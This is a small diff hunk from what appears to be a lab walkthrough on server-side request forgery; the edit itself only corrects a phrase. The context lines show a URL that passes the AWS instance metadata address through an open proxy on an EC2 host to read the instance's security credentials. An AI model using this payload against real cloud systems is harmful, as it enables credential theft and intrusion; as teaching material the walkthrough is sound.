@@ -135,7 +135,7 @@ You may have to install requests, but looks like it is already installed on curr
 
 ### OK the proxy service is verified as working...
 
-### In a browser let's take what we were able to find with AWS Instance meta-data from the python interpreter and put in a browser:
+### In a browser let's take what we were able to find with AWS Instance meta-data from the python interpreter and put into a browser:
 	http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 
 #### And the same goes here!  
